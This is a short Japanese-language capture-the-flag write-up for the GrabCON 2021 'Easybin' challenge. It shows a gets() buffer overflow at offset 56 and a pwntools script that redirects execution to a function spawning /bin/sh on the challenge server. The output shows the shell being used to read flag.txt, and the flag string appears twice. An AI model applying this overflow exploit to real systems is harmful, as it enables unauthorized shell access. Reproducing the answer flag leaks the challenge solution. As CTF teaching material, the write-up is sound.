# Writeup

実行ファイルが与えられる。

`gets`関数のBOFにより、`RSP`を書き換えることができる。

```bash
gdb-peda$ patto AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL found at offset: 56
```

offsetを調べたところ56であった。

`/bin/sh`を実行する関数`vuln`があるので、ここに飛ばす。

```bash
gdb-peda$ disas vuln
Dump of assembler code for function vuln:
   0x0000000000401146 <+0>:     push   rbp
   0x0000000000401147 <+1>:     mov    rbp,rsp
   0x000000000040114a <+4>:     mov    edx,0x0
   0x000000000040114f <+9>:     mov    esi,0x0
   0x0000000000401154 <+14>:    lea    rax,[rip+0xead]        # 0x402008
   0x000000000040115b <+21>:    mov    rdi,rax
   0x000000000040115e <+24>:    call   0x401040 <execve@plt>
   0x0000000000401163 <+29>:    mov    eax,0x0
   0x0000000000401168 <+34>:    pop    rbp
   0x0000000000401169 <+35>:    ret
End of assembler dump.
```

```py
from pwn import *

e = ELF('easybin')
# io = remote('35.205.161.145', 49153)
io = remote('35.246.38.194', 31337)

offset = b'a' * 56
payload = offset + p64(e.symbols['vuln'])
io.sendline(payload)
io.interactive()
```

```bash
$ python3 solver.py
[*] '/mnt/c/Users/Owner/Desktop/workspace/2021/GrabCON_CTF_2021/Easybin/easybin'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Opening connection to 35.246.38.194 on port 31337: Done
[*] Switching to interactive mode
$ ls
bin
dev
easybin
flag.txt
lib
lib32
lib64
$ cat flag.txt
GrabCON{w3ll_Y0u_Kn0w_Basics!!!}
```

<!-- GrabCON{w3ll_Y0u_Kn0w_Basics!!!} -->
